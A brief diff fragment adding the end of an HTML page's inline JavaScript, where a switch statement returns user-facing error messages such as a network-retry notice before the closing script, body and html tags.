+			case 'GTO':
+				return "Network error, please retry later.";
+			default: return "Unknown error({0}). Please contact your support desk.".replace('{0}', 'UNK');
+		}
+	}
+/*]]>*/
+</script>
+</body>
+</html>
